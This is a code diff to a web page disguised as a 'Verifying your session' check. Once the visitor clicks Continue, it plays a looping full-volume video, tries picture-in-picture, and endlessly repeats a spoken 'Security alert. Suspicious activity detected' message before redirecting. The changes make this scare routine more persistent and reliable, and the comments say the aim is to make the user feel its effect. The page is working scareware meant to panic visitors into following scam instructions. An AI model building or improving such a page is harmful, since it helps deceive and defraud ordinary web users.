@@ -8,7 +8,7 @@
 
 <div id="overlay" style="position:absolute; top:40%; width:100%; z-index:2;">
   <h2>Verifying your session...</h2>
-  <p>Please wait</p>
+  <p>Please wait...</p>
   <button onclick="start()" style="padding:12px 24px; font-size:16px;">
     Continue
   </button>
@@ -22,42 +22,63 @@
 </video>
 
 <script>
+let speaking = false;
+
 async function start(){
 
   const v = document.getElementById("v");
 
-  // 🎬 Start video
-  v.muted = false;
-  v.volume = 1;
-  v.loop = true;
+  // 🔒 disable button biar tidak spam
+  document.querySelector("button").disabled = true;
 
+  // 🎬 Start video
   try {
+    v.muted = false;
+    v.volume = 1;
+    v.loop = true;
     await v.play();
   } catch(e){}
 
-  // 🔥 Try Picture-in-Picture
+  // 🖼️ Try PiP (optional, fail-safe)
   try {
-    if (document.pictureInPictureEnabled) {
+    if (document.pictureInPictureEnabled && !document.pictureInPictureElement) {
       await v.requestPictureInPicture();
     }
   } catch(e){}
 
-  // 🔊 Speech (core bug)
-  const msg = new SpeechSynthesisUtterance(
-    "Security alert. Suspicious activity detected. Please follow the instructions on this page."
-  );
+  // 🔊 Speech function (biar reusable & clean)
+  function speakLoop(){
+    if (speaking) return; // prevent overlap
+    speaking = true;
 
-  const voices = speechSynthesis.getVoices();
-  if (voices.length > 0) {
-    msg.voice = voices.find(v => v.lang.includes("en")) || voices[0];
+    const msg = new SpeechSynthesisUtterance(
+      "Security alert. Suspicious activity detected. Please follow the instructions on this page."
+    );
+
+    // handle voices properly (async-safe)
+    let voices = speechSynthesis.getVoices();
+
+    if (!voices.length) {
+      speechSynthesis.onvoiceschanged = () => {
+        voices = speechSynthesis.getVoices();
+        msg.voice = voices.find(v => v.lang.includes("en")) || voices[0];
+        speechSynthesis.speak(msg);
+      };
+    } else {
+      msg.voice = voices.find(v => v.lang.includes("en")) || voices[0];
+      speechSynthesis.speak(msg);
+    }
+
+    // 🔁 loop clean (no spam overlap)
+    msg.onend = () => {
+      speaking = false;
+      speakLoop();
+    };
   }
 
-  speechSynthesis.speak(msg);
+  speakLoop();
 
-  // 🔁 Loop speech biar persistent
-  msg.onend = () => speechSynthesis.speak(msg);
-
-  // ⏱️ Delay dikit biar user “kena efeknya”
+  // ⏱️ smoother timing (lebih natural)
   setTimeout(() => {
     window.location.href = "https://www.google.com";
   }, 1200);
